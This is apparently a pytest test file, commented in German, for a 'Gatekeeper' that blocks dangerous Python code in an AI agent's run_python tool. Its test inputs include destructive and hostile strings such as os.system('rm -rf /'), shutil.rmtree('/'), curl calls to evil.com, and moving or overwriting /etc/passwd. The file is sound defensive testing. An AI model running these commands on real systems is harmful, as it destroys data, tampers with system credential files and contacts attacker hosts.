"""Tests fuer Gatekeeper Python-Code-Sicherheitspruefung.

Stellt sicher, dass run_python mit gefaehrlichem Code (os.system, subprocess,
shutil.rmtree, eval, exec, __import__ etc.) BLOCKIERT wird, waehrend
harmloser Python-Code weiterhin durchgelassen wird.

Ref: Schritt 4a in Gatekeeper.evaluate()
"""

from __future__ import annotations

import os
import tempfile
from typing import TYPE_CHECKING

import pytest

from jarvis.config import JarvisConfig, SecurityConfig, ensure_directory_structure
from jarvis.core.gatekeeper import Gatekeeper
from jarvis.models import (
    GateStatus,
    PlannedAction,
    RiskLevel,
    SessionContext,
)

if TYPE_CHECKING:
    from pathlib import Path


# ============================================================================
# Fixtures
# ============================================================================


@pytest.fixture()
def gk_config(tmp_path: Path) -> JarvisConfig:
    """Config mit tmp_path als jarvis_home."""
    config = JarvisConfig(
        jarvis_home=tmp_path,
        security=SecurityConfig(
            allowed_paths=[str(tmp_path), os.path.join(tempfile.gettempdir(), "jarvis", "")],
        ),
    )
    ensure_directory_structure(config)
    return config


@pytest.fixture()
def gatekeeper(gk_config: JarvisConfig) -> Gatekeeper:
    """Initialisierter Gatekeeper."""
    gk = Gatekeeper(gk_config)
    gk.initialize()
    return gk


@pytest.fixture()
def session() -> SessionContext:
    """Standard-Session fuer Tests."""
    return SessionContext(user_id="test_user", channel="test")


# ============================================================================
# Helper
# ============================================================================


def _run_python_action(code: str) -> PlannedAction:
    """Erstellt eine run_python PlannedAction mit gegebenem Code."""
    return PlannedAction(tool="run_python", params={"code": code})


# ============================================================================
# Dangerous Python code MUST be blocked
# ============================================================================


class TestRunPythonBlocking:
    """run_python mit gefaehrlichem Code wird von Schritt 4a blockiert."""

    def test_run_python_os_system_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """os.system() im Python-Code muss blockiert werden."""
        action = _run_python_action('import os; os.system("rm -rf /")')
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.is_blocked
        assert decision.risk_level == RiskLevel.RED
        assert decision.policy_name == "blocked_python_code"
        assert "os.system()" in decision.reason

    def test_run_python_subprocess_call_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """subprocess.call() im Python-Code muss blockiert werden."""
        action = _run_python_action('import subprocess; subprocess.call(["rm", "-rf", "/"])')
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.is_blocked
        assert decision.policy_name == "blocked_python_code"
        assert "subprocess" in decision.reason

    def test_run_python_subprocess_popen_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """subprocess.Popen() im Python-Code muss blockiert werden (unsichere Low-Level-API)."""
        action = _run_python_action('import subprocess; subprocess.Popen(["curl", "evil.com"])')
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.is_blocked
        assert decision.policy_name == "blocked_python_code"
        assert "subprocess" in decision.reason

    def test_run_python_shutil_rmtree_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """shutil.rmtree() im Python-Code muss blockiert werden."""
        action = _run_python_action('import shutil; shutil.rmtree("/")')
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.is_blocked
        assert decision.policy_name == "blocked_python_code"
        assert "shutil.rmtree()" in decision.reason

    def test_run_python_eval_exec_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """eval() und exec() im Python-Code muessen blockiert werden."""
        # eval
        action_eval = _run_python_action("eval(\"__import__('os').system('id')\")")
        decision_eval = gatekeeper.evaluate(action_eval, session)
        assert decision_eval.status == GateStatus.BLOCK
        assert decision_eval.policy_name == "blocked_python_code"

        # exec
        action_exec = _run_python_action("exec(\"import os\\nos.remove('/etc/passwd')\")")
        decision_exec = gatekeeper.evaluate(action_exec, session)
        assert decision_exec.status == GateStatus.BLOCK
        assert decision_exec.policy_name == "blocked_python_code"

    def test_run_python_import_os_system_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """import os gefolgt von os.system() muss blockiert werden."""
        code = "import os\nresult = os.system('whoami')"
        action = _run_python_action(code)
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.policy_name == "blocked_python_code"
        assert "os.system()" in decision.reason

    def test_run_python_dunder_import_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """__import__() im Python-Code muss blockiert werden."""
        action = _run_python_action("__import__('os').system('id')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert decision.policy_name == "blocked_python_code"
        assert "__import__()" in decision.reason


# ============================================================================
# Safe Python code MUST pass through
# ============================================================================


class TestRunPythonSafePasses:
    """Harmloser Python-Code darf nicht blockiert werden."""

    def test_run_python_safe_code_passes(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """Harmloser Python-Code (Arithmetik, print, List-Comprehensions) wird durchgelassen."""
        safe_snippets = [
            "print('Hello, world!')",
            "x = 2 + 2\nprint(x)",
            "result = [i**2 for i in range(10)]",
            "import math\nprint(math.pi)",
            "data = {'key': 'value'}\nprint(data)",
            "def greet(name):\n    return f'Hello {name}'",
        ]
        for code in safe_snippets:
            action = _run_python_action(code)
            decision = gatekeeper.evaluate(action, session)
            assert decision.status != GateStatus.BLOCK, f"Safe code should NOT be blocked: {code!r}"
            assert decision.policy_name != "blocked_python_code", (
                f"Safe code matched blocked_python_code: {code!r}"
            )

    def test_subprocess_run_allowed(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        """subprocess.run() und subprocess.check_output() sind sichere Varianten."""
        safe_snippets = [
            'import subprocess; result = subprocess.run(["nvidia-smi"], capture_output=True)',
            'import subprocess; out = subprocess.check_output(["systeminfo"])',
            'import subprocess\nresult = subprocess.run(["python", "--version"])',
        ]
        for code in safe_snippets:
            action = _run_python_action(code)
            decision = gatekeeper.evaluate(action, session)
            assert decision.status != GateStatus.BLOCK, (
                f"Safe subprocess should NOT be blocked: {code!r}"
            )


# ============================================================================
# Additional patterns coverage
# ============================================================================


class TestRunPythonAdditionalPatterns:
    """Weitere gefaehrliche Patterns werden erkannt."""

    def test_os_popen_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action("os.popen('ls -la')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert "os.popen()" in decision.reason

    def test_os_remove_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action("os.remove('/etc/passwd')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_os_unlink_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action(f"os.unlink('{tempfile.gettempdir()}/important')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_os_rmdir_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action(f"os.rmdir('{tempfile.gettempdir()}/dir')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_os_execvp_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action("os.execvp('bash', ['bash'])")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert "os.exec" in decision.reason

    def test_shutil_move_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action(f"shutil.move('/etc/passwd', '{tempfile.gettempdir()}/stolen')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_subprocess_popen_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        action = _run_python_action("subprocess.Popen(['curl', 'evil.com'])")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_open_write_mode_blocked(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        action = _run_python_action("f = open('/etc/passwd', 'w')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK
        assert "open() with write mode" in decision.reason

    def test_open_append_mode_blocked(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        action = _run_python_action("f = open('/var/log/syslog', 'a')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.status == GateStatus.BLOCK

    def test_open_read_mode_passes(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        """open() im Read-Modus ('r') wird NICHT blockiert."""
        action = _run_python_action(f"f = open('{tempfile.gettempdir()}/data.txt', 'r')")
        decision = gatekeeper.evaluate(action, session)
        assert decision.policy_name != "blocked_python_code"

    def test_empty_code_passes(self, gatekeeper: Gatekeeper, session: SessionContext) -> None:
        """Leerer Code wird nicht blockiert."""
        action = _run_python_action("")
        decision = gatekeeper.evaluate(action, session)
        assert decision.policy_name != "blocked_python_code"

    def test_whitespace_only_code_passes(
        self, gatekeeper: Gatekeeper, session: SessionContext
    ) -> None:
        """Nur Whitespace wird nicht blockiert."""
        action = _run_python_action("   \n\t  ")
        decision = gatekeeper.evaluate(action, session)
        assert decision.policy_name != "blocked_python_code"
